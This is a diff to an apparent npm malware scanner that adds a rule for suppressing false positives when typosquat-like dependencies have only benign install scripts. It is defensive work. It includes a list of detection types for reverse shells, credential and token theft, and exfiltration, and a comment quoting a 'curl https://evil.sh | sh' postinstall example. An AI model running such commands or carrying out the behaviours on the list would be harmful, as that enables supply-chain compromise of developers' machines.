@@ -1034,6 +1034,111 @@ function vendorMinifiedBundle(result, meta) {
   return false;
 }
 
+// ============================================================================
+// Feature 13 — typosquat_benign_lifecycle (v2.11.28, weekly review 2026-05-22, 9 FP)
+// ============================================================================
+//
+// Targets the dependency_typosquat boundary-squat cluster (Axios UNC1069 rule
+// RT-C1 fired in March 2026 + RT-C1-FPR audit 2026-05). The boundary-squat
+// scanner emits `dependency_typosquat` MEDIUM on any sub-dep matching
+// `<prefix>-<popular>` or `<popular>-<suffix>` when the extra token is not in
+// LEGIT_BOUNDARY_TOKENS. The compound `typosquat_lifecycle` (CRITICAL,
+// src/scoring.js:517-523) escalates it to CRITICAL whenever a lifecycle hook
+// is present — including provably benign ones like `husky install`,
+// `npm run build`, or `node patches/apply-patches.js` (balena-cli pattern).
+//
+// F13 suppresses that compound's contribution when all lifecycle scripts are
+// provably benign AND no real exfil / IOC / `dependency_typosquat_used`
+// signal is present. The Axios UNC1069 discriminator (require()d sub-dep)
+// emits dependency_typosquat_used + the dependency_typosquat_require
+// compound — both vetoed in F13_VETO_TYPES.
+//
+// Reuses `isSafeLifecycleScript` from src/monitor/temporal.js:53 (covers
+// `npm run build`, `tsc`, `eslint`, etc.) and extends it with audit-observed
+// patterns: husky install, simple-git-hooks, patch-package,
+// `node patches/apply-patches.js`, is-ci || X guard.
+
+const { isSafeLifecycleScript } = require('../monitor/temporal.js');
+
+const F13_BENIGN_SCRIPT_RE = /^(?:is-ci\s*\|\|\s*)?(?:husky(?:\s+install)?|simple-git-hooks|patch-package|node\s+patches\/apply-patches\.js|npm\s+run\s+build(?::[a-z0-9_-]+)?)\s*$/i;
+
+function isBenignLifecycleScript(value) {
+  if (!value || typeof value !== 'string') return false;
+  if (isSafeLifecycleScript(value)) return true;
+  return value.trim().split(/\s*&&\s*/).every(cmd => F13_BENIGN_SCRIPT_RE.test(cmd.trim()));
+}
+
+const F13_VETO_TYPES = new Set([
+  // Egress / exfil — any real network capability is a campaign signal
+  'suspicious_dataflow', 'suspicious_domain', 'remote_code_load', 'curl_exec',
+  'intent_credential_exfil', 'intent_command_exfil', 'fetch_decrypt_exec',
+  'reverse_shell', 'binary_dropper', 'download_exec_binary',
+  'curl_env_exfil', 'external_tarball_dep', 'dependency_url_suspicious',
+  'blockchain_c2_resolution', 'dns_exfil',
+  // Worm propagation (Shai-Hulud)
+  'npm_publish_worm', 'node_modules_write', 'npm_token_steal',
+  // IOC hits
+  'ioc_match', 'known_malicious_package', 'shai_hulud_marker', 'ioc_string_match',
+  // DPRK / mini Shai-Hulud 2026-05
+  'detached_credential_exfil', 'ai_config_injection', 'ide_task_persistence',
+  // Axios UNC1069 discriminator: dep is require()d in code
+  'dependency_typosquat_used', 'dependency_typosquat_require'
+]);
+
+const F13_LIFECYCLE_KEYS = ['preinstall', 'install', 'postinstall', 'prepare'];
+
+/**
+ * Feature 13 — TRUE iff the package shows the compound `typosquat_lifecycle`
+ * (boundary-squat dep + lifecycle hook) AND every declared lifecycle script
+ * is provably benign AND no exfil / IOC / dep-usage signal is present.
+ *
+ * Discriminator vs malware:
+ *   - Axios UNC1069 wrappers emit `dependency_typosquat_used` (the dep is
+ *     require()d in source) + compound `dependency_typosquat_require` → veto.
+ *   - Shai-Hulud worm emits `npm_publish_worm`, `node_modules_write`,
+ *     `npm_token_steal` → veto.
+ *   - GlassWorm / DPRK emit `unicode_invisible_injection` (downstream
+ *     irrelevant — caught at scanner severity)/ `detached_credential_exfil`
+ *     / `ai_config_injection` / `ide_task_persistence` → veto.
+ *   - Real install-time droppers carry suspicious_dataflow / suspicious_domain
+ *     / remote_code_load / curl_exec / intent_*_exfil → veto.
+ *   - Hand-crafted `curl https://evil.sh | sh` postinstall fails
+ *     isBenignLifecycleScript → veto.
+ *
+ * Targets the v2.11.28 weekly review 2026-05-22 cluster:
+ *   - @doyourjob/gravity-ui-page-constructor (prepare: husky install)
+ *   - balena-cli (postinstall: node patches/apply-patches.js)
+ *   - magmastream (prepare: npm run build)
+ *   - @1d1s/design-system (prepare: npm run build:lib)
+ *   - @healthcare-interoperability/fhir-storage-core (prepare: npm run build)
+ *   - @quicore/problem-details-error (prepare: npm run build)
+ *
+ * Cap 30 (MEDIUM). Matches the F9 (mcp_server_env_access) cap because both
+ * suppress a compound-driven CRITICAL into the residual MEDIUM signal.
+ */
+function typosquatBenignLifecycle(result, meta) {
+  const threats = (result && result.threats) || [];
+  if (!threats.some(t => t.type === 'dependency_typosquat' || t.type === 'typosquat_detected')) return false;
+  if (!threats.some(t => t.type === 'lifecycle_script')) return false;
+  if (!threats.some(t => t.type === 'typosquat_lifecycle')) return false;
+
+  for (const t of threats) {
+    if (F13_VETO_TYPES.has(t.type)) return false;
+  }
+
+  const scripts = (meta && meta.registryMeta && meta.registryMeta.scripts) || null;
+  if (!scripts || typeof scripts !== 'object') return false;
+
+  let sawScript = false;
+  for (const key of F13_LIFECYCLE_KEYS) {
+    const v = scripts[key];
+    if (typeof v !== 'string' || v.trim().length === 0) continue;
+    sawScript = true;
+    if (!isBenignLifecycleScript(v)) return false;
+  }
+  return sawScript;
+}
+
 /**
  * Feature 8 — TRUE iff the package declares at least one install
  * lifecycle script AND the scan shows no network egress capability
@@ -1272,5 +1377,7 @@ module.exports = {
   mcpServerEnvAccess,
   vendorCliSdk,
   aiAgentBot,
-  vendorMinifiedBundle
+  vendorMinifiedBundle,
+  typosquatBenignLifecycle,
+  isBenignLifecycleScript
 };
